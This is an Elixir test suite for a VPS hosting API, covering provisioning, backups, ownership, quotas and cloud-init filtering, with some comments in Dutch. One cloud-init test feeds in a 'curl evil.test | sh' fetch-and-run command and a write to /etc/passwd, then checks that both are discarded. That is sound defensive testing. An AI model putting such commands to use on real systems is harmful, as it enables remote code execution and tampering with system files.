defmodule ControlPlaneWeb.VpsControllerTest do
  use ControlPlaneWeb.ConnCase, async: true

  import ControlPlane.Fixtures
  import Ecto.Query, only: [from: 2]

  alias ControlPlane.Accounts
  alias ControlPlane.Backups.VpsBackup
  alias ControlPlane.Fleet
  alias ControlPlane.Fleet.Command
  alias ControlPlane.Fleet.Node
  alias ControlPlane.Fleet.Package
  alias ControlPlane.Fleet.Region
  alias ControlPlane.Fleet.Vps
  alias ControlPlane.Provisioning
  alias ControlPlane.Repo

  # --- fixtures --------------------------------------------------------------

  defp insert_region(attrs \\ %{}) do
    code = "r-#{System.unique_integer([:positive])}"

    %Region{}
    |> Region.changeset(Map.merge(%{code: code, name: "Region #{code}"}, attrs))
    |> Repo.insert!()
  end

  defp insert_node(region, attrs \\ %{}) do
    %Node{}
    |> Node.changeset(
      Map.merge(
        %{name: "node-#{System.unique_integer([:positive])}", region_id: region.id},
        attrs
      )
    )
    |> Ecto.Changeset.change(%{
      status: :online,
      last_heartbeat_at: DateTime.utc_now() |> DateTime.truncate(:second),
      total_vcpu: 32,
      total_ram_mb: 65_536,
      total_disk_gb: 1000,
      available_vcpu: 32,
      available_ram_mb: 65_536,
      available_disk_gb: 1000
    })
    |> Repo.insert!()
  end

  # The size-based create charges the matching package's price (O-9), so create
  # tests need an available package that fits the 2 vCPU / 4 GB / 50 GB requests.
  defp insert_package do
    Repo.insert!(%Package{
      name: "Test",
      cpu_cores: 2,
      ram_gb: 4,
      disk_gb: 50,
      price_monthly: Decimal.new("5.00"),
      is_available: true
    })
  end

  defp auth(conn, user) do
    token = Accounts.generate_user_session_token(user) |> Base.url_encode64(padding: false)
    put_req_header(conn, "authorization", "Bearer " <> token)
  end

  defp create_vps_for(user, region, name) do
    {:ok, %{vps: vps}} =
      Provisioning.create_vps(%{
        region_id: region.id,
        name: name,
        vcpu: 2,
        ram_mb: 4096,
        disk_gb: 50,
        owner_id: user.id,
        owner_email: user.email,
        template_id: 9000
      })

    vps
  end

  setup do
    region = insert_region()
    _node = insert_node(region)
    _package = insert_package()
    # Confirmed users: create tests spend the signup bonus (see the package price
    # comment above) and that bonus only exists after email confirmation.
    %{
      region: region,
      user: confirmed_user_fixture("owner@example.com"),
      other: confirmed_user_fixture("other@example.com")
    }
  end

  # --- the endpoint a customer connects to ------------------------------------

  describe "the public endpoint" do
    test "a VPS on a node with a public address gets an SSH port", %{conn: conn, user: user} do
      region = insert_region()
      insert_node(region, %{public_host: "nl2.bunkhosting.nl", public_port_start: 20_000})

      params = %{
        "region_code" => region.code,
        "name" => "web",
        "vcpu" => 2,
        "ram_mb" => 4096,
        "disk_gb" => 50
      }

      assert %{"vps" => vps} =
               conn
               |> auth(user)
               |> post(~p"/api/v1/vpses", consented(params))
               |> json_response(201)

      assert vps["public_host"] == "nl2.bunkhosting.nl"
      assert vps["ssh_port"] == 20_000
      assert [%{"target_port" => 22, "purpose" => "ssh"}] = vps["port_forwards"]
    end

    test "two VPSes on one node get different ports", %{conn: conn, user: user} do
      region = insert_region()
      insert_node(region, %{public_host: "nl2.bunkhosting.nl"})

      params = %{
        "region_code" => region.code,
        "vcpu" => 2,
        "ram_mb" => 4096,
        "disk_gb" => 50
      }

      one =
        conn |> auth(user) |> post(~p"/api/v1/vpses", consented(Map.put(params, "name", "one")))

      two =
        conn |> auth(user) |> post(~p"/api/v1/vpses", consented(Map.put(params, "name", "two")))

      assert json_response(one, 201)["vps"]["ssh_port"] !=
               json_response(two, 201)["vps"]["ssh_port"]
    end

    test "a node with no public address yields no endpoint, and no error", %{
      conn: conn,
      region: region,
      user: user
    } do
      # This is the honest answer for a node on a home connection. Inventing an
      # endpoint, or failing the create, would both be worse than saying nothing.
      params = %{
        "region_id" => region.id,
        "name" => "web",
        "vcpu" => 2,
        "ram_mb" => 4096,
        "disk_gb" => 50
      }

      assert %{"vps" => vps} =
               conn
               |> auth(user)
               |> post(~p"/api/v1/vpses", consented(params))
               |> json_response(201)

      assert is_nil(vps["public_host"])
      assert is_nil(vps["ssh_port"])
      assert vps["port_forwards"] == []
    end
  end

  # --- restore points --------------------------------------------------------

  describe "backups" do
    defp done_backup(vps) do
      %VpsBackup{}
      |> VpsBackup.changeset(%{
        vps_id: vps.id,
        node_id: vps.node_id,
        status: :done,
        volid: "local:backup/vzdump-qemu-#{System.unique_integer([:positive])}.vma.zst",
        started_at: DateTime.utc_now() |> DateTime.add(-3600) |> DateTime.truncate(:second),
        finished_at: DateTime.utc_now() |> DateTime.add(-3500) |> DateTime.truncate(:second)
      })
      |> Repo.insert!()
    end

    test "lists the owner's restore points", %{conn: conn, region: region, user: user} do
      mine = create_vps_for(user, region, "mine")
      done_backup(mine)

      assert %{"backups" => [backup]} =
               conn
               |> auth(user)
               |> get(~p"/api/v1/vpses/#{mine.id}/backups")
               |> json_response(200)

      assert backup["status"] == "done"
      # The volid is the node's internal handle on a file; no business of a
      # customer's and not in the response.
      refute Map.has_key?(backup, "volid")
    end

    test "another user's restore points are not found", %{
      conn: conn,
      region: region,
      user: user,
      other: other
    } do
      theirs = create_vps_for(other, region, "theirs")
      done_backup(theirs)

      assert conn
             |> auth(user)
             |> get(~p"/api/v1/vpses/#{theirs.id}/backups")
             |> json_response(404)
    end

    test "restoring puts the VPS into :restoring", %{conn: conn, region: region, user: user} do
      mine = create_vps_for(user, region, "mine")
      {:ok, active} = mine |> Vps.changeset(%{status: :active}) |> Repo.update()
      {:ok, _} = active |> Ecto.Changeset.change(provider_vm_id: "106") |> Repo.update()
      point = done_backup(active)

      assert %{"vps" => vps} =
               conn
               |> auth(user)
               |> post(~p"/api/v1/vpses/#{active.id}/backups/#{point.id}/restore")
               |> json_response(202)

      assert vps["status"] == "restoring"
    end

    test "restoring from another user's backup is not found", %{
      conn: conn,
      region: region,
      user: user,
      other: other
    } do
      mine = create_vps_for(user, region, "mine")

      {:ok, mine} =
        mine |> Ecto.Changeset.change(status: :active, provider_vm_id: "106") |> Repo.update()

      theirs = create_vps_for(other, region, "theirs")
      point = done_backup(theirs)

      assert conn
             |> auth(user)
             |> post(~p"/api/v1/vpses/#{mine.id}/backups/#{point.id}/restore")
             |> json_response(404)
    end

    test "restoring a VPS that has no guest yet says so, rather than 500", %{
      conn: conn,
      region: region,
      user: user
    } do
      # Still provisioning: no guest on the node to restore onto. Both "no guest"
      # and "wrong status" are true here; the API answers with the one that tells
      # the customer something.
      mine = create_vps_for(user, region, "mine")
      point = done_backup(mine)

      assert %{"error" => "not_provisioned"} =
               conn
               |> auth(user)
               |> post(~p"/api/v1/vpses/#{mine.id}/backups/#{point.id}/restore")
               |> json_response(409)
    end

    test "restoring a VPS that is being deleted is a conflict", %{
      conn: conn,
      region: region,
      user: user
    } do
      mine = create_vps_for(user, region, "mine")

      {:ok, deleting} =
        mine
        |> Ecto.Changeset.change(status: :deleting, provider_vm_id: "106")
        |> Repo.update()

      point = done_backup(deleting)

      assert %{"error" => "invalid_status_deleting"} =
               conn
               |> auth(user)
               |> post(~p"/api/v1/vpses/#{deleting.id}/backups/#{point.id}/restore")
               |> json_response(409)
    end
  end

  # --- herroepingsrecht -------------------------------------------------------

  describe "bevestiging van onmiddellijke levering" do
    test "zonder bevestiging geen VPS, en geen afschrijving", %{
      conn: conn,
      region: region,
      user: user
    } do
      saldo_voor = ControlPlane.Credits.balance_cents(user.id)

      params = %{
        "region_id" => region.id,
        "name" => "web",
        "vcpu" => 2,
        "ram_mb" => 4096,
        "disk_gb" => 50
      }

      assert %{"error" => "no_delivery_consent"} =
               conn |> auth(user) |> post(~p"/api/v1/vpses", params) |> json_response(422)

      # De weigering hoort vóór Credits.charge te vallen: een afgewezen
      # bestelling die de klant wel geld kost is erger dan geen bestelling.
      assert ControlPlane.Credits.balance_cents(user.id) == saldo_voor
      assert Repo.aggregate(from(v in Vps, where: v.owner_id == ^user.id), :count) == 0
    end

    test "een expliciete false telt niet als bevestiging", %{
      conn: conn,
      region: region,
      user: user
    } do
      params = %{
        "region_id" => region.id,
        "name" => "web",
        "vcpu" => 2,
        "ram_mb" => 4096,
        "disk_gb" => 50,
        "immediate_delivery_consent" => false
      }

      assert %{"error" => "no_delivery_consent"} =
               conn |> auth(user) |> post(~p"/api/v1/vpses", params) |> json_response(422)
    end

    test "met bevestiging wordt het moment vastgelegd", %{
      conn: conn,
      region: region,
      user: user
    } do
      params = %{
        "region_id" => region.id,
        "name" => "web",
        "vcpu" => 2,
        "ram_mb" => 4096,
        "disk_gb" => 50
      }

      assert %{"vps" => %{"id" => id}} =
               conn
               |> auth(user)
               |> post(~p"/api/v1/vpses", consented(params))
               |> json_response(201)

      # De bewijslast dat de klant om directe levering vroeg ligt bij ons, dus
      # een boolean in het verzoek is niet genoeg: het moment moet blijven staan.
      assert %Vps{withdrawal_waiver_at: %DateTime{}} = Repo.get!(Vps, id)
    end
  end

  # --- what a customer may put in cloud-init ---------------------------------

  describe "cloud-init input" do
    test "only the keys the agent reads are kept", %{conn: conn, region: region, user: user} do
      # Everything else was stored in the command payload forever and then
      # ignored, which is retention without a purpose.
      params = %{
        "region_id" => region.id,
        "name" => "web",
        "vcpu" => 2,
        "ram_mb" => 4096,
        "disk_gb" => 50,
        "cloud_init" => %{
          "user" => "stijn",
          "password" => "geheim",
          "runcmd" => ["curl evil.test | sh"],
          "write_files" => [%{"path" => "/etc/passwd"}]
        }
      }

      assert %{"vps" => %{"id" => id}} =
               conn
               |> auth(user)
               |> post(~p"/api/v1/vpses", consented(params))
               |> json_response(201)

      command =
        Repo.one!(from(c in Command, where: c.vps_id == ^id and c.kind == :provision))

      assert command.payload["cloud_init"] == %{"user" => "stijn", "password" => "geheim"}
    end

    test "a non-map cloud_init is dropped rather than crashing", %{
      conn: conn,
      region: region,
      user: user
    } do
      # Four creates cost more than the signup bonus; the wallet is not what this
      # test is about.
      {:ok, _} = ControlPlane.Credits.add_entry(user.id, 5_000, "admin_adjustment", "test")

      for junk <- ["een string", 42, ["lijst"], nil] do
        params = %{
          "region_id" => region.id,
          "name" => "web-#{System.unique_integer([:positive])}",
          "vcpu" => 2,
          "ram_mb" => 4096,
          "disk_gb" => 50,
          "cloud_init" => junk
        }

        assert conn
               |> auth(user)
               |> post(~p"/api/v1/vpses", consented(params))
               |> json_response(201)
      end
    end

    test "an oversized or empty value is dropped", %{conn: conn, region: region, user: user} do
      params = %{
        "region_id" => region.id,
        "name" => "web",
        "vcpu" => 2,
        "ram_mb" => 4096,
        "disk_gb" => 50,
        "cloud_init" => %{"user" => String.duplicate("a", 500), "password" => ""}
      }

      assert %{"vps" => %{"id" => id}} =
               conn
               |> auth(user)
               |> post(~p"/api/v1/vpses", consented(params))
               |> json_response(201)

      command =
        Repo.one!(from(c in Command, where: c.vps_id == ^id and c.kind == :provision))

      assert command.payload["cloud_init"] == %{}
    end
  end

  # --- auth gate -------------------------------------------------------------

  test "rejects unauthenticated requests", %{conn: conn} do
    assert conn |> get(~p"/api/v1/vpses") |> json_response(401)
  end

  # --- index -----------------------------------------------------------------

  describe "GET /api/v1/vpses" do
    test "lists only the caller's own VPSes", %{
      conn: conn,
      region: region,
      user: user,
      other: other
    } do
      mine = create_vps_for(user, region, "mine")
      _theirs = create_vps_for(other, region, "theirs")

      assert %{"vpses" => [vps]} =
               conn |> auth(user) |> get(~p"/api/v1/vpses") |> json_response(200)

      assert vps["id"] == mine.id
      assert vps["name"] == "mine"
    end
  end

  # --- create ----------------------------------------------------------------

  describe "POST /api/v1/vpses" do
    test "provisions a VPS owned by the caller", %{conn: conn, region: region, user: user} do
      params = %{
        "region_id" => region.id,
        "name" => "web",
        "vcpu" => 2,
        "ram_mb" => 4096,
        "disk_gb" => 50
      }

      assert %{"vps" => vps} =
               conn
               |> auth(user)
               |> post(~p"/api/v1/vpses", consented(params))
               |> json_response(201)

      assert vps["name"] == "web"
      # Owner fields are never echoed, and ownership came from the session.
      refute Map.has_key?(vps, "owner_email")
      assert [persisted] = Fleet.list_vpses_for_owner(user.id)
      assert persisted.id == vps["id"]
    end

    test "ignores an owner_id supplied in the body (no spoofing)", %{
      conn: conn,
      region: region,
      user: user,
      other: other
    } do
      params = %{
        "region_id" => region.id,
        "name" => "web",
        "vcpu" => 2,
        "ram_mb" => 4096,
        "disk_gb" => 50,
        "owner_id" => other.id
      }

      assert conn
             |> auth(user)
             |> post(~p"/api/v1/vpses", consented(params))
             |> json_response(201)

      assert Fleet.list_vpses_for_owner(other.id) == []
      assert [_one] = Fleet.list_vpses_for_owner(user.id)
    end

    test "resolves a region_code", %{conn: conn, region: region, user: user} do
      params = %{
        "region_code" => region.code,
        "name" => "web",
        "vcpu" => 2,
        "ram_mb" => 4096,
        "disk_gb" => 50
      }

      assert conn
             |> auth(user)
             |> post(~p"/api/v1/vpses", consented(params))
             |> json_response(201)
    end

    test "no region at all means Bunk picks one", %{conn: conn, user: user} do
      params = %{"name" => "web", "vcpu" => 2, "ram_mb" => 4096, "disk_gb" => 50}

      assert %{"vps" => vps} =
               conn
               |> auth(user)
               |> post(~p"/api/v1/vpses", consented(params))
               |> json_response(201)

      assert [persisted] = Fleet.list_vpses_for_owner(user.id)
      assert persisted.id == vps["id"]
      # Automatic still lands the VPS in a real region, not a null one.
      assert persisted.region_id
    end

    test "automatic placement picks the emptiest node's region", %{
      conn: conn,
      region: region,
      user: user
    } do
      # The setup region's node is the one with capacity; a second region whose
      # node is nearly full must not win just by existing.
      crowded = insert_region()

      %Node{}
      |> Node.changeset(%{
        name: "full-#{System.unique_integer([:positive])}",
        region_id: crowded.id
      })
      |> Ecto.Changeset.change(%{
        status: :online,
        last_heartbeat_at: DateTime.utc_now() |> DateTime.truncate(:second),
        total_vcpu: 32,
        total_ram_mb: 65_536,
        total_disk_gb: 1000,
        available_vcpu: 2,
        available_ram_mb: 4096,
        available_disk_gb: 50
      })
      |> Repo.insert!()

      params = %{"name" => "web", "vcpu" => 2, "ram_mb" => 4096, "disk_gb" => 50}

      assert conn
             |> auth(user)
             |> post(~p"/api/v1/vpses", consented(params))
             |> json_response(201)

      assert [persisted] = Fleet.list_vpses_for_owner(user.id)
      assert persisted.region_id == region.id
    end

    # A typo must not quietly place the customer somewhere else: only the absence
    # of a region means "anywhere".
    test "422 for an unknown region", %{conn: conn, user: user} do
      params = %{
        "region_code" => "nope",
        "name" => "web",
        "vcpu" => 2,
        "ram_mb" => 4096,
        "disk_gb" => 50
      }

      assert %{"error" => "region_not_found"} =
               conn
               |> auth(user)
               |> post(~p"/api/v1/vpses", consented(params))
               |> json_response(422)
    end

    test "422 for a zero/negative spec", %{conn: conn, region: region, user: user} do
      params = %{
        "region_id" => region.id,
        "name" => "web",
        "vcpu" => 0,
        "ram_mb" => 4096,
        "disk_gb" => 50
      }

      assert %{"error" => "invalid_vps"} =
               conn
               |> auth(user)
               |> post(~p"/api/v1/vpses", consented(params))
               |> json_response(422)

      neg = %{params | "vcpu" => 2, "disk_gb" => -10}
      assert conn |> auth(user) |> post(~p"/api/v1/vpses", consented(neg)) |> json_response(422)
      # Nothing was persisted for the rejected requests.
      assert Fleet.list_vpses_for_owner(user.id) == []
    end

    test "422 for an absurdly large spec", %{conn: conn, region: region, user: user} do
      params = %{
        "region_id" => region.id,
        "name" => "web",
        "vcpu" => 9_999,
        "ram_mb" => 4096,
        "disk_gb" => 50
      }

      assert conn
             |> auth(user)
             |> post(~p"/api/v1/vpses", consented(params))
             |> json_response(422)
    end

    test "429 once the per-owner quota is reached", %{conn: conn, region: region, user: user} do
      # The cap is filled for real instead of lowered with Application.put_env:
      # that is global state, this file is async, and a parallel test that
      # creates a VPS would then get a 429 it never asked for. The rows go in
      # straight through Repo because what is under test here is the HTTP status
      # the controller puts on :quota_exceeded, not the counting itself --
      # grenswaarden_test.exs owns the boundary.
      cap = Application.get_env(:control_plane, :max_vpses_per_owner, 10)

      for n <- 1..cap do
        Repo.insert!(%Vps{
          name: "vol-#{n}",
          vcpu: 1,
          ram_mb: 1024,
          disk_gb: 10,
          status: :active,
          owner_id: user.id,
          owner_email: user.email,
          region_id: region.id
        })
      end

      over = %{
        "region_id" => region.id,
        "name" => "one-too-many",
        "vcpu" => 2,
        "ram_mb" => 4096,
        "disk_gb" => 50
      }

      assert %{"error" => "quota_exceeded"} =
               conn
               |> auth(user)
               |> post(~p"/api/v1/vpses", consented(over))
               |> json_response(429)

      assert Provisioning.count_live_vpses(user.id) == cap
    end
  end

  # --- show / delete ownership ----------------------------------------------

  describe "ownership enforcement" do
    test "show returns 404 for another user's VPS", %{
      conn: conn,
      region: region,
      user: user,
      other: other
    } do
      theirs = create_vps_for(other, region, "theirs")

      assert %{"error" => "not_found"} =
               conn |> auth(user) |> get(~p"/api/v1/vpses/#{theirs.id}") |> json_response(404)
    end

    test "show returns 404 for a malformed id", %{conn: conn, user: user} do
      assert conn |> auth(user) |> get(~p"/api/v1/vpses/not-a-uuid") |> json_response(404)
    end

    test "delete refuses another user's VPS and leaves it intact", %{
      conn: conn,
      region: region,
      user: user,
      other: other
    } do
      theirs = create_vps_for(other, region, "theirs")

      assert conn |> auth(user) |> delete(~p"/api/v1/vpses/#{theirs.id}") |> json_response(404)
      # Still owned by `other`, untouched.
      assert [still] = Fleet.list_vpses_for_owner(other.id)
      assert still.id == theirs.id
    end

    test "owner can see their own VPS", %{conn: conn, region: region, user: user} do
      mine = create_vps_for(user, region, "mine")

      assert %{"vps" => %{"id" => id}} =
               conn |> auth(user) |> get(~p"/api/v1/vpses/#{mine.id}") |> json_response(200)

      assert id == mine.id
    end

    test "owner can clean up their own :failed VPS", %{conn: conn, region: region, user: user} do
      vps = create_vps_for(user, region, "broken")
      {:ok, failed} = vps |> Ecto.Changeset.change(status: :failed) |> Repo.update()

      assert conn |> auth(user) |> delete(~p"/api/v1/vpses/#{failed.id}") |> json_response(202)
      assert Repo.get!(Vps, failed.id).status == :deleted
    end
  end

  # Elke bestelling vereist de bevestiging van onmiddellijke levering. Dat staat
  # los van waar deze tests over gaan, dus hij wordt hier toegevoegd in plaats
  # van achttien keer uitgeschreven. De twee tests die de bevestiging zelf
  # onderzoeken zetten hem bewust niet via deze helper.
  defp consented(params), do: Map.put(params, "immediate_delivery_consent", true)
end
